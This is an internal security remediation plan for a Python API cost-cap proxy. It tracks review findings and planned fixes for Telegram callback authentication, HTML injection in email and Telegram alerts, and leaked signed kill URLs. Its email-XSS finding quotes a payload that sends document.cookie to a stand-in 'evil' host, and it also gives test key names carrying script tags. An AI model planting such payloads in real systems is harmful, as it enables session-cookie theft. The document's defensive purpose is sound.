# Code-review remediation plan (v2)

Living doc. Originally consolidated 24 findings from two adversarial code reviews; now also tracks 9 findings from the four follow-up investigations. Status reflects state at HEAD.

Per `/Users/danlowry/Desktop/AI/CLAUDE.md`: every step is labelled with the cheapest model competent for the task. Escalate one tier if the cheaper attempt fails.

## At-a-glance status

```
Original plan (26 items): 25 shipped, 1 in flight, 0 open
Investigation follow-ups (9 items): 0 shipped, 0 in flight, 9 open
```

The original plan is effectively complete. **The active work now is the new findings surfaced by the channel-audit and threat-model investigations.**

## Part 1 — Original plan: final status

Numbering from v1. Branches and merge commits noted where applicable.

| ID  | Title                                                       | Status | Ref                |
| --- | ----------------------------------------------------------- | ------ | ------------------ |
| C1  | Cap enforcement race under concurrency                      | ✓      | merge `b0f64b7`    |
| C2  | Stored XSS in admin HTML pages via key name                 | ✓      | merge `5589763`    |
| C3  | Bcrypt linear-scan token verification per request           | ✓      | merge `b81742d`    |
| M1  | Pricing fallback silently bills unknown models at Sonnet    | ✓      | merge `f55d4f5`    |
| M2  | `tourniquet_cap_hit` stop_reason may break Anthropic SDKs   | ✓      | merge `8633d83`    |
| M3  | SSE parser uses unset / stale `event_type`                  | ✓      | merge `8633d83`    |
| M4  | No request body-size limit on `/v1/messages`                | ✓      | merge `9ede1d5`    |
| M5  | Proxy strips `idempotency-key` header                       | ✓      | merge `9ede1d5`    |
| M6  | Background `fan_out` task is fire-and-forget                | ✓      | merge `ff786d3`    |
| M7  | `update_cap` doesn't enforce cap ≤ absolute_ceiling         | ✓      | merge `3ba5e29`    |
| M8  | `_sleep_protection_status` owner attribution wrong          | ✓      | merge `3ba5e29`    |
| M9  | Linux / Windows sleep detection lies                        | ✓      | merge `3ba5e29`    |
| m1  | `_decrypt_anthropic_key` re-imports Fernet per request      | ✓      | merge `9ede1d5`    |
| m2  | `config.py` accepts unvalidated `fernet_key` / `secret_key` | ✓      | merge `7c2eaaf`    |
| m3  | `enable_*_notifications` typed as `str` not `bool`          | 🔄     | branch `cr/w2p2-m3`|
| m4  | Sentry init runs after schema setup                         | ✓      | merge `22a27db`    |
| m5  | Magic-link reissue overwrites old token, error misleads     | ✓      | merge `22a27db`    |
| m6  | `lift-by-amount` `new_cap_after` dead code                  | ✓      | merge `5589763`    |
| m7  | TOCTOU window in `_assert_token_unused`                     | ✓      | merge `5589763`    |
| m8  | Dashboard Copy handler swallows clipboard rejection         | ✓      | merge `22a27db`    |
| m9  | `integration_snippets.html` hardcodes `http://`             | ✓      | merge `22a27db`    |
| n1  | `cost_pence` deprecated alias                               | ✓      | merge `f55d4f5`    |
| n2  | `import` inside functions                                   | ✓      | merges `3ba5e29` + `9ede1d5` |
| n3  | Duplicate `"profiles_obj"` key in `new_key_form`            | ✓      | merge `3ba5e29`    |

Plus two items added during the follow-up investigations:

| ID  | Title                                                       | Status | Ref                |
| --- | ----------------------------------------------------------- | ------ | ------------------ |
| I2  | Async-mock RuntimeWarnings in 2 test files                  | ✓      | branch `cr/test-mocks` (`1dd2439`) |
| I5  | Migration drift on `profile.default` + alembic CLI broken   | ✓      | branch `cr/migration-state` (`a144b9c`) |

I2 and I5 are committed on their own branches but not yet merged to main as of this writing.

## Part 2 — New findings from investigations (active work)

These came out of the four follow-up investigations (channel security audit, cache pricing, threat model, static-analysis baseline). All open.

### Priority summary

| ID   | Severity | Title                                                       | Phase |
| ---- | -------- | ----------------------------------------------------------- | ----- |
| C4   | Critical | `/telegram/callback` unauthenticated when `TELEGRAM_WEBHOOK_SECRET` unset | 1 |
| C5   | Critical | Telegram poller dispatches callbacks without `chat_id` validation | 1 |
| M10  | Major    | `kill_now_url` (signed magic-link) sent to generic webhook in full | 2 |
| M11  | Major    | `api_key_name` interpolated into email HTML body without escaping | 2 |
| M12  | Major    | `api_key_name` interpolated into Telegram HTML messages     | 2     |
| M13  | Major    | `kill_now_url` written plaintext to JSONL log               | 2     |
| M14  | Major    | Adopt explicit trust mode + ship `docs/security-model.md`   | 2     |
| M1a  | Major    | Implement Anthropic cache-token fields in pricing path      | 2     |
| M1b  | Minor    | Verify `pricing.py` rates against current Anthropic page    | 3     |

### Phase 1 — Block launch until fixed

#### C4. `/telegram/callback` unauthenticated when secret unset

**File:** `src/tourniquet/alerts/telegram_callbacks.py:143-147`

**Issue.** The callback route checks `X-Telegram-Bot-Api-Secret-Token` only when `settings.telegram_webhook_secret` is non-empty. If the operator hasn't configured the secret (the common case for local-only deployments), any HTTP client that can reach the route can POST a fabricated `callback_query` payload and trigger `kill` or `lift_by_amount` against any key UUID.

**Fix.** Refuse to register the route at all when the secret is unset, OR fail closed: return 401 if the header is missing AND no secret is configured. The safer default is the second — it forces the operator to either configure the secret or accept that callbacks won't work, instead of silently accepting unauthenticated POSTs. Pair with M14 (trust mode) — in localhost mode, the Telegram callback route should not be mounted at all.

**Tests.** New `tests/test_telegram_callback_auth.py`:
- POST with no header + no secret configured → 401.
- POST with wrong header + secret configured → 401.
- POST with correct header + secret configured → 200.

**Model.** Sonnet — protocol auth judgment.

#### C5. Telegram poller doesn't validate chat_id on callbacks

**File:** `src/tourniquet/alerts/telegram_poller.py:151-206`

**Issue.** The long-poller dispatches lift/kill on every `callback_query` update without verifying `cq.message.chat.id == settings.telegram_chat_id`. An attacker who learns the bot token (e.g., from a leaked `.env`, a misconfigured backup, a stolen laptop) can send `callback_query` events from any chat and trigger unrestricted cap manipulation.

**Fix.** Add a chat-id gate at the top of `_dispatch`:
```python
expected_chat_id = settings.telegram_chat_id
chat_id = (cq.get("message") or {}).get("chat", {}).get("id")
if expected_chat_id and str(chat_id) != str(expected_chat_id):
    log.warning("Rejecting Telegram callback from unexpected chat %s", chat_id)
    await self._answer_callback_query(cq_id, "Unauthorized chat")
    return
```

**Tests.** Extend `tests/test_telegram_poller.py`:
- Existing happy-path tests pass with `settings.telegram_chat_id == "999"`.
- New: callback with `chat.id=42` and `settings.telegram_chat_id="999"` → no dispatch, warning logged.

**Model.** Sonnet.

### Phase 2 — Fix before launch

#### M10. `kill_now_url` leaked to generic webhook

**File:** `src/tourniquet/alerts/webhook.py:25-30`

**Issue.** `dataclasses.asdict(event)` serialises the entire `AlertEvent`, including `kill_now_url` (a 24h-valid signed magic-link), to the configured `ALERT_WEBHOOK_URL`. Any third-party that receives the webhook now holds the kill capability for that key for 24h.

**Fix.** Build the outbound payload explicitly instead of `asdict` — drop `kill_now_url` and any `lift_by_amount`-style URLs from the generic-webhook channel:
```python
payload = {
    "api_key_name": event.api_key_name,
    "threshold_pct": event.threshold_pct,
    "spent_usd_cents": event.spent_usd_cents,
    "cap_usd_cents": event.cap_usd_cents,
    "display_currency": event.display_currency,
    "today": event.today.isoformat(),
    "message": message,
}
```
Generic webhooks are notification fanout, not control plane — they should never carry kill/lift authority.

**Tests.** Extend `tests/test_webhook.py` (create if absent): assert outbound payload does NOT contain `kill_now_url` or any `/admin/` URL.

**Model.** Haiku — mechanical edit.

#### M11. `api_key_name` interpolated into email HTML body

**File:** `src/tourniquet/alerts/email.py:108`

**Issue.** `message` (containing user-controlled `api_key_name`) is placed inside `<p>` tags with no `html.escape()`. A key named `<img src=x onerror=fetch('//evil/'+document.cookie)>` injects HTML/JS into the recipient's email client.

**Fix.** Escape the message before HTML interpolation, OR build the email body with Jinja2 (autoescape on) — same approach the C2 admin-XSS fix used:
```python
import html as _html
body_html = f"<p>{_html.escape(message)}</p>..."
```
Better: extract the email body to a Jinja template under `templates/email/threshold_alert.html` and use the existing template machinery.

**Tests.** New `tests/test_email_alert_xss.py`: build an event with `api_key_name="<script>alert(1)</script>"`, intercept the Resend payload, assert the body contains `&lt;script&gt;` not `<script>`.

**Model.** Sonnet — Jinja extraction is the cleaner fix.

#### M12. `api_key_name` injected into Telegram HTML messages

**Files:** `src/tourniquet/alerts/telegram.py:27, 63, 110`

**Issue.** All Telegram sends use `parse_mode: HTML`, and the `message` string is interpolated directly. Telegram's HTML mode supports `<a>`, `<b>`, `<i>`, `<code>`, `<pre>` — a key named `<a href="https://evil">click here</a>` becomes a clickable link in the user's Telegram.

**Fix.** HTML-escape the message before sending, restricted to the characters Telegram's HTML mode treats specially (`<`, `>`, `&`):
```python
def _escape_telegram_html(text: str) -> str:
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
```
Apply at every send site. Consider also switching to `parse_mode: MarkdownV2` if it's a better fit — but escaping HTML is the smaller change.

**Tests.** Extend `tests/test_notifier.py` or new `tests/test_telegram_xss.py`: send an event with a malicious-named key, assert the outgoing payload's `text` contains `&lt;a` not `<a`.

**Model.** Haiku.

#### M13. `kill_now_url` written plaintext to JSONL log

**File:** `src/tourniquet/alerts/jsonl_log.py:30-37`

**Issue.** The full `AlertEvent` is serialised to `~/.tourniquet/alerts.jsonl` including the signed kill URL. The directory inherits umask — on a system with `umask 0022`, the file is world-readable. Any process or user that can read it gains a 24h kill capability for every alerted key.

**Fix.** Two-layer:
1. Strip `kill_now_url` from the JSONL payload before writing — same rationale as M10. The log is for observability, not control.
2. Set explicit permissions on the file/directory:
   ```python
   path.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
   path.touch(exist_ok=True)
   path.chmod(0o600)
   ```

**Tests.** New `tests/test_jsonl_log_security.py`:
- Write one event, assert the resulting JSON lacks `kill_now_url`.
- Assert `path.stat().st_mode & 0o777 == 0o600`.

**Model.** Haiku.

#### M14. Trust-mode env var + `docs/security-model.md`

**Files:** `src/tourniquet/config.py`, `src/tourniquet/main.py`, `src/tourniquet/dashboard/routes.py`, new `docs/security-model.md`.

**Issue.** Codebase assumes "localhost is the trust boundary"; `docs/deploy.md` actively recommends deployment scenarios where the dashboard is network-reachable. No middleware enforces the localhost assumption. Stored XSS, bcrypt linear scan, Telegram callback auth all change severity depending on which model is in play. The threat-model investigation produced a draft `docs/security-model.md` ready to ship and recommends explicit `TOURNIQUET_TRUST_MODE=localhost|network` with magic-link session gating in `network` mode.

**Fix.** Five parts:
1. Add `trust_mode: Literal["localhost", "network"] = "localhost"` to `config.Settings`.
2. Add a startup check in `main.py` lifespan: if the bind address is non-loopback AND `trust_mode == "localhost"`, log a loud WARNING (or refuse to start — pick one and document).
3. Add session middleware that requires a magic-link session for `/dashboard/*` and `/admin/*` routes when `trust_mode == "network"`. Proxy `/v1/messages` stays bearer-only — that's correct for SDK clients.
4. Add a `TOURNIQUET_BOOTSTRAP_TOKEN` escape hatch printed to stdout/journalctl on first start in network mode without configured email transport. Single-use, valid for 60 minutes.
5. Ship `docs/security-model.md` from the threat-model investigation's draft. Update `docs/deploy.md` to set `TOURNIQUET_TRUST_MODE=network` in every "make it reachable" snippet.

**Tests.** New `tests/test_trust_mode.py`:
- Localhost mode: dashboard/admin routes accessible without auth.
- Network mode: dashboard/admin require session; bearer-token routes work.
- Bind to `0.0.0.0` with `trust_mode=localhost` logs the WARNING.
- Bootstrap token grants one-time session in network mode without email.

**Model.** Opus — design judgment, security boundary, cross-cutting middleware change.

#### M1a. Implement Anthropic cache-token fields

**Files:** `src/tourniquet/providers/anthropic.py`, `src/tourniquet/billing/pricing.py`, `src/tourniquet/proxy/router.py`.

**Issue.** Per the cache-pricing investigation: Anthropic's SSE `message_start.usage` and `message_delta.usage` events carry `cache_creation_input_tokens` and `cache_read_input_tokens`. Tourniquet ignores both — cache reads bill at full input rate (10× Anthropic's actual rate). A heavily cache-using session hits the daily cap at ~10% of the user's intended spend.

**Fix.** Per the investigation's sketch:
1. Add `cache_creation_input_tokens` and `cache_read_input_tokens` to `UsageAccumulator`. Read them from both `message_start` and `message_delta` usage objects.
2. Extend `_RATES` from `(input, output)` 2-tuples to `(input, cache_write_5m, cache_read, output)` 4-tuples. Cache write rate ≈ 1.25× input, cache read rate = 0.1× input (verify against current Anthropic docs at fix time).
3. Update `cost_usd_cents` signature to accept the two new optional cache-token args (default 0 for backward compat).
4. Update call sites in `proxy/router.py` (non-streaming and streaming paths) to pass the cache token counts from the accumulator.

**Tests.** Extend `tests/test_pricing.py`:
- Cost with cache fields zero matches current behaviour (regression).
- Cost with cache_read=1M for Sonnet returns $0.30 not $3.
- Cost with cache_creation=1M for Sonnet returns $3.75 not $3.

**Model.** Sonnet — bounded refactor with clear test coverage.

### Phase 3 — Cleanup

#### M1b. Verify pricing table against current Anthropic page

**File:** `src/tourniquet/billing/pricing.py:11-21`

**Issue.** The cache-pricing investigation noted that the rates currently in `pricing.py` (Opus $15/$75, Haiku $0.80/$4) appear to diverge from what the current Anthropic docs show ($5/$25 for Opus 4.7, $1/$5 for Haiku 4.5). Either the investigator misread or `pricing.py` is stale on the new model IDs.

**Fix.** Web-fetch `https://www.anthropic.com/pricing` and `https://docs.anthropic.com/en/docs/build-with-claude/prompt-caching` at fix time. Update `_RATES` to match. Add a unit test that documents the source URL and expected rates per model so future drift is visible.

**Model.** Haiku — mechanical lookup + edit.

## Part 3 — Execution plan for the open work

Recommended order:

1. **Phase 1 batch (C4, C5 — Telegram auth)** — Sonnet. Both fixes are bounded; C4 is a route-level decision, C5 is one chat-id check in `_dispatch`. Land on `cr/telegram-auth`. Add the new tests. ~1 hr.

2. **Phase 2 channel-XSS batch (M10, M11, M12, M13)** — Mostly Haiku, M11 escalates to Sonnet for the Jinja extraction. Land on `cr/channel-xss`. ~2 hr.

3. **M1a + M1b cache pricing** — Sonnet. Pair them: M1b first to confirm the rates you'll plug into M1a's table. Land on `cr/cache-pricing`. ~1.5 hr.

4. **M14 trust-mode + security-model.md** — Opus. The biggest item. Middleware change touches request lifecycle for every dashboard/admin route. Land on `cr/trust-mode`. ~3 hr.

Phases 1, 2, and 3 are mutually independent and can run in parallel. Phase 4 (M14) should land last because it changes the auth posture other branches assume.

Each branch ends with `pytest -q` green plus the new tests in that branch passing. No merge to main until the matching tests exist.

## Part 4 — Verification gates before launch

- [ ] `pytest -q` green plus all new tests added per fix above.
- [ ] `mypy --strict` clean across `src/tourniquet/`.
- [ ] `ruff check src/ tests/` clean (a `ruff check --fix` sweep was tracked separately as Phase 4 cleanup in v1; verify it landed).
- [ ] `pip-audit` against a fresh venv (`python -m venv .venv && pip install -e .[dev,postgres] && pip-audit`) — this run was contaminated in v1 by polluted global Python env; redo before launch.
- [ ] `alembic upgrade head` against a Postgres test container, then `alembic check` — verifies models.py and migrations are in sync. (Migration 0001 uses `pgcrypto`, so SQLite-based check is not sufficient.)
- [ ] Manual: create a key named `<script>alert(1)</script>`, click every admin link from email, Slack, Telegram. Confirm no script execution. Confirm no HTML injection in Telegram message bubble.
- [ ] Manual: fire 20 concurrent `curl` requests at a $1 cap with $0.10 per-request worst-case; assert post-run `caps_today.total ≤ 1.00`. (Verifies C1's atomic reservation under load.)
- [ ] Manual: with `trust_mode=network`, hit `/dashboard` from a non-loopback address; confirm magic-link required.
- [ ] Manual: with `trust_mode=localhost` and bind=`0.0.0.0`, confirm startup log contains the "non-loopback bind in localhost trust mode" warning.
- [ ] Manual: send a fabricated `callback_query` to the Telegram poller from a chat_id other than `settings.telegram_chat_id`; confirm rejected.

## Part 5 — Out of scope / known limitations

Items the reviews surfaced but won't be fixed in this round:

- **Migration 0001 uses Postgres-only DDL (`CREATE EXTENSION pgcrypto`, `gen_random_uuid()`).** SQLite-based `alembic upgrade head` is impossible; the SQLite path uses `Base.metadata.create_all()` in `cli.py::cmd_start` instead. This dual schema-creation mechanism is a recurring footgun (see `cr/migration-state` for the `profile.default` drift it caused). Long-term fix: branch on `op.get_bind().dialect.name` inside each migration so both backends run from `alembic upgrade head`. Scope: ~1 day's work, separate from launch.

- **`alembic check` requires Postgres.** Fixed in `cr/migration-state` so the alembic CLI runs without `DATABASE_URL`, but full schema-vs-models verification still needs a Postgres instance because of the previous bullet.

- **Test-suite RuntimeWarning hygiene.** `cr/test-mocks` cleared the 9 warnings observed at v1; if any new tests added during Phase 1/2/3 reintroduce AsyncMock leaks, they'll need the same `session.add = MagicMock()` / `_mock_telegram_client()` patterns.

- **`pip-audit` against project deps was contaminated** in v1 by a polluted global Python env (90 CVEs across packages NOT in `pyproject.toml`). The one finding that IS a real project dep — `cryptography@44.0.3` with 2 CVEs — should be checked individually. Re-running in a clean venv is on the launch-gate checklist above.

- **ruff (300 findings) and mypy --strict (60 errors)** baseline established in v1's static-analysis investigation. Most of the ruff findings are line-length and import-ordering; one `ruff check --fix` pass clears the bulk. Mypy hotspot is `url_handler.py` (18 errors, mostly `winreg` not stubbed on macOS — needs platform guards). Tracked as a Phase 4 cleanup in v1.

- **Per-key alert-email override** (`ApiKey.alert_email`) is wired into `AlertEvent` but the email channel currently only honours the global `RESEND_FROM_EMAIL` recipient. Not a security bug; a UX gap.

- **Cache TTL detection.** Anthropic supports both 5-minute and 1-hour cache TTLs at different write rates. M1a treats all cache writes at the 5-minute rate (1.25×) because the SSE protocol doesn't distinguish them. This under-bills 1-hour cache writes by ~38% — much smaller than the current 10× over-bill on cache reads, and cache-1h is rarely used in practice.

## Cross-references

- `tests/test_*.py` — full test suite (207 tests at this writing, 3 skipped).
- `migrations/versions/000{1..4}_*.py` — schema lineage. 0004 lives on `cr/migration-state`; will be 0004 or higher once merged depending on what lands first.
- `docs/deploy.md` — deployment scenarios (Docker / Proxmox LXC / Pi / cloud VM). Needs updating once M14 ships to set `TOURNIQUET_TRUST_MODE=network` in every network-reachable recipe.
- `docs/security-model.md` — to be created as part of M14.
- `SECURITY.md` — current disclosure policy. Update after M14 to point at the new security-model doc.
- `FEATURE_REQUESTS.md` — track non-launch items (per-key alert-email recipient override, Postgres-or-SQLite migration unification, ruff/mypy hygiene sweep) here.
